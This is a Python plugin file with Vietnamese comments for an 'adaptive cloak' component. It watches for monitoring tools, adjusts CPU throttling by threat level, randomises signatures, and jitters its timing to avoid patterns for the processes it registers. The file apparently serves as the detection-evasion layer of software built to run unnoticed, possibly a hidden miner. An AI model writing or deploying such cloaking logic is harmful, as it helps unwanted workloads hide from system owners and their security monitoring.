"""cpu_plugins.cloaking.adaptive_cloak_plugin

Plugin thay đổi CPU throttle tùy theo threat-level.
"""
from __future__ import annotations

import logging
import threading
import time
from typing import Dict, Any, Optional, Set

from ..core import ICpuTechnique, register_plugin
from .signature_randomizer import SignatureRandomizer


@register_plugin("adaptive_cloak")
class AdaptiveCloakPlugin(ICpuTechnique):
    """
    Plugin thay đổi CPU throttle tùy theo threat-level.
    
    Kích hoạt pipeline đọc PSI/IPC và threat monitor, sau đó điều chỉnh
    throttling dựa trên mức độ đe dọa phát hiện được.
    """
    
    name = "adaptive_cloak"
    priority = 15
    
    def __init__(self):
        """Khởi tạo plugin."""
        self.logger = logging.getLogger(__name__)
        self.engine = None
        self._tracked_pids: Set[int] = set()
        self._config = {}
        self._signature_randomizer = None
        self._monitoring_thread = None
        self._running = False
    
    def init(self, engine: Any, config: Optional[Dict[str, Any]] = None) -> bool:
        """
        Khởi tạo plugin với engine và cấu hình.
        
        Args:
            engine: Engine quản lý tài nguyên CPU
            config: Cấu hình tùy chọn
            
        Returns:
            True nếu khởi tạo thành công, False nếu thất bại
        """
        self.engine = engine
        self._config = config or {}
        
        try:
            # Khởi tạo signature randomizer
            self._signature_randomizer = SignatureRandomizer(logger=self.logger)
            
            # Bắt đầu threat monitoring thread
            self._start_monitoring()
            
            # Kích hoạt adaptive cloaking loop trong engine (nếu có)
            if hasattr(engine, "start_adaptive_cloaking"):
                engine.start_adaptive_cloaking()
                
                self.logger.info("Adaptive cloak plugin đã sẵn sàng - monitoring thread đã kích hoạt")
                return True
                
        except Exception as exc:
            self.logger.error(f"Không thể khởi tạo adaptive cloak plugin: {exc}")
            return False
    
    def _start_monitoring(self):
        """Bắt đầu luồng giám sát đe dọa"""
        if self._monitoring_thread is not None and self._monitoring_thread.is_alive():
            return  # Đã đang chạy
        
        self._running = True
        self._monitoring_thread = threading.Thread(
            target=self._monitoring_loop,
            daemon=True,
            name="adaptive-cloak-monitor"
        )
        self._monitoring_thread.start()
        
    def _monitoring_loop(self):
        """Loop giám sát và phản ứng với đe dọa"""
        if not self._signature_randomizer:
            self.logger.error("Monitoring loop started without signature_randomizer")
            return
            
        while self._running:
            try:
                # Kiểm tra công cụ giám sát
                threat_info = self._signature_randomizer.detect_monitoring_tools()
                
                # Phản hồi với mức độ đe dọa
                if threat_info and threat_info.get('found', False):
                    self._respond_to_threat(threat_info)
                
                # Ngủ với jitter để tránh mẫu
                time.sleep(30 + (time.time() % 10))
                
            except Exception as e:
                self.logger.error(f"Lỗi trong monitoring loop: {e}")
                time.sleep(60)  # Ngủ dài hơn nếu có lỗi
    
    def _respond_to_threat(self, threat_info):
        """Phản hồi với thông tin đe dọa"""
        threat_level = threat_info.get('threat_level', 'LOW')
        
        # Điều chỉnh các tham số theo mức độ đe dọa
        if hasattr(self.engine, "adapt_to_threat"):
            self.engine.adapt_to_threat(threat_level)
            self.logger.info(f"Đã điều chỉnh engine theo mức đe dọa: {threat_level}")
                
    def register_pid(self, pid: int) -> None:
        """Đăng ký PID với plugin để theo dõi và bảo vệ.
        
        Args:
            pid: Process ID cần theo dõi
        """
        if self._signature_randomizer:
            self._signature_randomizer.register_pid(pid)
        self._tracked_pids.add(pid)
        
    def unregister_pid(self, pid: int) -> None:
        """Hủy đăng ký PID.
        
        Args:
            pid: Process ID cần hủy đăng ký
        """
        if self._signature_randomizer:
            self._signature_randomizer.unregister_pid(pid)
        if pid in self._tracked_pids:
            self._tracked_pids.remove(pid)
            
    def shutdown(self) -> None:
        """Dừng plugin và giải phóng tài nguyên."""
        self._running = False
        
        if self._signature_randomizer:
            self._signature_randomizer.stop()
            
        if self._monitoring_thread and self._monitoring_thread.is_alive():
            try:
                self._monitoring_thread.join(timeout=2.0)
            except Exception:
                pass 